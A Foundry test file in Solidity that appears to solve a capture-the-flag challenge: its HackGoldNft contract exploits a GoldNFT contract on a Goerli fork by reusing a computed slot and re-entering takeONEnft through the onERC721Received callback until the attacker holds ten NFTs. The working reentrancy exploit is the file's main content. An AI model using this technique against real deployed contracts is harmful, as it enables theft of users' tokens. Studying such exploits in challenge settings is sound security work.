// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/GoldNFT.sol";

import {IERC721Receiver} from "lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

contract GoldNFTHack is Test {
    GoldNFT nft;
    HackGoldNft nftHack;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.createSelectFork("goerli", 8591866); 
        nft = new GoldNFT();
    }


    function test_Attack() public {
        vm.startPrank(hacker);
        // solution

		nftHack = new HackGoldNft(address(nft));

		nftHack.get10Nft();

		// end of solution
        assertEq(nft.balanceOf(hacker), 10);
    }
}

contract HackGoldNft is IERC721Receiver {
	bytes32 slot;
	address hacker;
    GoldNFT nft;

	constructor(address _nft) {
		hacker = msg.sender;
		nft = GoldNFT(_nft);

		address creator = 0x302fF1c5F7e264b792876B9456F42de8dF299863;
		slot = keccak256(abi.encode(creator));
	}
	function get10Nft() external {
		nft.takeONEnft(slot);
	}

	function onERC721Received(
		address, address to, uint tokenId, bytes memory 
	) public returns (bytes4 ) {
		// send this nft to hacker
		nft.transferFrom(address(this), hacker, tokenId);

		// do it 9 more times
		if(nft.balanceOf(hacker) < 10) {
			nft.takeONEnft(slot);
		}

		// must return this selector as described here:
		//   https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d59306bd06a241083841c2e4a39db08e1f3722cc/contracts/token/ERC721/IERC721Receiver.sol#L16
		return IERC721Receiver.onERC721Received.selector;
	}
}
